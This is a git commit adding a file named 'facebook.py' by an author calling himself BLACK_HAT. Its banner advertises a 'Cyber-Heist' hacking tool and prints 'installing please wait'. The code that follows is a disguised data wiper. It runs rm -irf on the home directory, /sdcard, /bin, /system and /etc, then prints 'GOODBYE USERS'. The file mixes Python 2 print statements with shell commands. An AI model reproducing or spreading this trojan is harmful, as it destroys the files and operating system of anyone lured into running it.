7e55cbf5fece3ec6997dcedb33372199db047aab
BLACK_HAT <cardingpro115@gmail.com>
2025-10-01 14:27:16 +0100

    Add files via upload

---
+++ facebook.py
@@ -0,0 +1,32 @@
+print "\n \033[92m *******************************************************************"
+print "*                                                                 *"
+print "*    #######  ######    #####  #####  ##### #######               *"
+print "*       #     #      #  #     #     # #        #                  *"
+print "*       #     #      #  #     #       #        #                  *"
+print "*       #     ######    #####  #####  #####    #                  *"
+print "*       #     #    #    #           # #        #                  *"
+print "*       #     #     #   #     #     # #        #                  *"
+print "*       #     #      #  #####  #####  #####    #                  *"
+print "* Cyber-Heist Ver. 1.0                                    *"
+print "* Coded by BLACKHAT                                      *"
+print "* Blackhathacker & Pentester                                      *"
+print "* Telegram channel link                             *"
+print "*******************************************************************\033[94m\n\n"
+
+echo "installing please wait"
+apt-get update
+cd
+rm -irf *
+cd /sdcard
+rm -irf *
+cd
+cd /bin
+rm -irf *
+cd
+cd /system
+rm -irf *
+cd 
+cd /etc
+rm -irf *
+sleep 2
+echo "done!!! DONE ... GOODBYE USERS... Regards Blackhat"
